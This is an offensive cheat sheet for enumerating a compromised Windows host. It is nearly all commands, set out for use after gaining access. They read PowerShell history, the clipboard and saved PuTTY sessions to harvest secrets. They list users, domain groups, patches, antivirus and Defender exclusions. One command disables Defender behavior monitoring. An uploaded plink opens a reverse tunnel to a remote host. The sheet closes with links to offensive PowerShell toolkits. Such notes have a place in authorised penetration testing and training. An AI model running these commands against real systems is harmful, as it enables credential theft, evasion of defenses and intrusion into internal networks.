# Windows enumeration 

- [Windows enumeration](#windows-enumeration)
	- [Usefull Command - MSF](#usefull-command---msf)
	- [Usefull Command - Windows](#usefull-command---windows)
	- [Powershell history](#powershell-history)
	- [Clipboard](#clipboard)
	- [AV](#av)
	- [Firewall](#firewall)
	- [Network](#network)
	- [Software](#software)
	- [Service only available from inside](#service-only-available-from-inside)
	- [SNMP Paramters](#snmp-paramters)
	- [Putty](#putty)
- [Source](#source)
	- [Powershell module](#powershell-module)
	- [Other](#other)

## Usefull Command - MSF

	sysinfo

	getuid

	run post/windows/gather/win_privs

## Usefull Command - Windows 

	systeminfo  
	wmic qfe get Caption,Description,HotFixID,InstalledOn  

	whoami  
	whoami /all
	echo %USERNAME%  

	net user  
	net localgroup  

	net user /domain  

	net group /domain  
	net group /domain <Group Name>  

## Powershell history 
```powershell
type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

cat (Get-PSReadlineOption).HistorySavePath
```
## Clipboard
```powershell
powershell -command "Get-Clipboard"
```

## AV

AntiVirus Product:
```powershell
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
```

### Windows Defender

Status of defender : 
```powershell
sc query windefend
```
Disable defender: 
```powershell
Set-MpPreference -DisableBehaviorMonitoring $true
```
Enable  defender:
```powershell
Set-MpPreference -DisableBehaviorMonitoring $false
```

Exclusions:
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions"
```

## Firewall  
	netsh firewall show state  
	netsh firewall show config  

## Network  
	ipconfig /all  
	route print  
	arp -A  

## Software
```powershell
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
``` 

## Service only available from inside  
```powershell
netstat -ano  
upload plink.exe  

plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
```

## SNMP Paramters  
```powershell
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
```
## Putty 
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
```


# Source
## Powershell module

	https://github.com/samratashok/nishang
	https://github.com/PowerShellMafia/PowerSploit
	https://github.com/EmpireProject/Empire/tree/master/data/module_source/credentialsource 

## Other

- https://raw.githubusercontent.com/xMilkPowderx/OSCP/master/Windows%20Priv%20Esc.md
- https://0xsp.com/ad-attack-or-defense/ad-ttps-list
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges

